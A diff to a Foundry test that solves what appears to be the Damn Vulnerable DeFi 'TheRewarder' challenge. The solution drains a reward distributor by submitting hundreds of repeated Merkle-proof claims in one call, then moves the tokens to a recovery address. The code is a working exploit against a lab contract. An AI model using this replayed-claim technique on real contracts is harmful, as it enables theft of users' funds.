@@ -148,49 +148,48 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        console.log(player);
+    
         bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
         bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
-        merkle = new Merkle();
-        dvtRoot = merkle.getRoot(dvtLeaves);
-        wethRoot = merkle.getRoot(wethLeaves);
+
+        uint256 PLAYER_DVT_CLAIN_AMOUNT = 11524763827831882;
+        uint256 PLAYER_WETH_CLAIN_AMOUNT = 1171088749244340;
+        
+        uint256 dvt_times = dvt.balanceOf(address(distributor)) / PLAYER_DVT_CLAIN_AMOUNT;
+        uint256 weth_times = weth.balanceOf(address(distributor)) / PLAYER_WETH_CLAIN_AMOUNT;
+
 
         IERC20[] memory tokensToClaim = new IERC20[](2);
         tokensToClaim[0] = IERC20(address(dvt));
         tokensToClaim[1] = IERC20(address(weth));
 
-        uint256 dvtTxCount = uint256(9997497975612005191) / uint256(11524763827831882);
-        uint256 wethTxCount = uint256(999771617011871775) / uint256(1171088749244340);
+        Claim[] memory claims = new Claim[](dvt_times + weth_times);
 
-        uint256 transactionCount = dvtTxCount + wethTxCount;
+        Claim memory claim_dvt = Claim({
+            batchNumber: 0, 
+            amount: PLAYER_DVT_CLAIN_AMOUNT,
+            tokenIndex: 0,
+            proof: merkle.getProof(dvtLeaves, 188)
+        });
 
-        Claim[] memory claims = new Claim[](transactionCount);
+        Claim memory claim_weth = Claim({
+            batchNumber: 0,
+            amount: PLAYER_WETH_CLAIN_AMOUNT,
+            tokenIndex: 1,
+            proof: merkle.getProof(wethLeaves, 188)
+        });
 
-        for (uint256 i = 0; i < dvtTxCount; i += 1) {
-            claims[i] = Claim({
-                batchNumber: 0,
-                amount: 11524763827831882,
-                tokenIndex: 0,
-                proof: merkle.getProof(dvtLeaves, 188)
-            });
+        for (uint256 i = 0; i < dvt_times; i++) {
+            claims[i] = claim_dvt;
+        }
+        for (uint256 i = dvt_times; i < dvt_times + weth_times; i++) {
+            claims[i] = claim_weth;
         }
 
-        for (uint256 i = dvtTxCount; i < transactionCount; i++) {
-            claims[i] = Claim({
-                batchNumber: 0,
-                amount: 1171088749244340,
-                tokenIndex: 1,
-                proof: merkle.getProof(wethLeaves, 188)
-            });
-        }
-
-        distributor.claimRewards(claims, tokensToClaim);
-
-        // Unclaimed DVT: 9997497975612005191 % 11524763827831882 = 5527736881763497
-        // Unclaimed WETH: 999771617011871775 % 1171088749244340 = 832913906449755
-
-        IERC20(address(dvt)).transfer(recovery, dvtTxCount * 11524763827831882);
-        IERC20(address(weth)).transfer(recovery, wethTxCount * 1171088749244340);
-
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
